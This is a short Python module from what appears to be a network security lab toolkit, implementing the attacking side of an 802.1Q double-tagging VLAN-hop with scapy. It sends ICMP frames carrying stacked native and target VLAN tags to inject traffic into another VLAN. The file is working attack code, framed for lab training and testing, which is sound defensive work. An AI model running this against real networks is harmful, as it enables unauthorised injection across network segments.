# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-vlan: 802.1Q double-tagging VLAN hop. LAB ONLY.

Sends a frame stacked with two VLAN tags: the first switch strips the outer
(native) tag and forwards the inner-tagged frame onto the target VLAN. One-way
only (no return path), but enough to inject into another VLAN.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    mac = s.get_if_hwaddr(args.iface)
    frame = (
        s.Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        / s.Dot1Q(vlan=args.native)
        / s.Dot1Q(vlan=args.target)
        / s.IP(dst=args.dst)
        / s.ICMP()
    )
    print(f"[*] sending double-tagged [{args.native},{args.target}] frame on {args.iface}")
    s.sendp(frame, iface=args.iface, count=args.count, verbose=0)
    verdict("ALERT", f"injected into VLAN {args.target} via native VLAN {args.native}")
    return 0
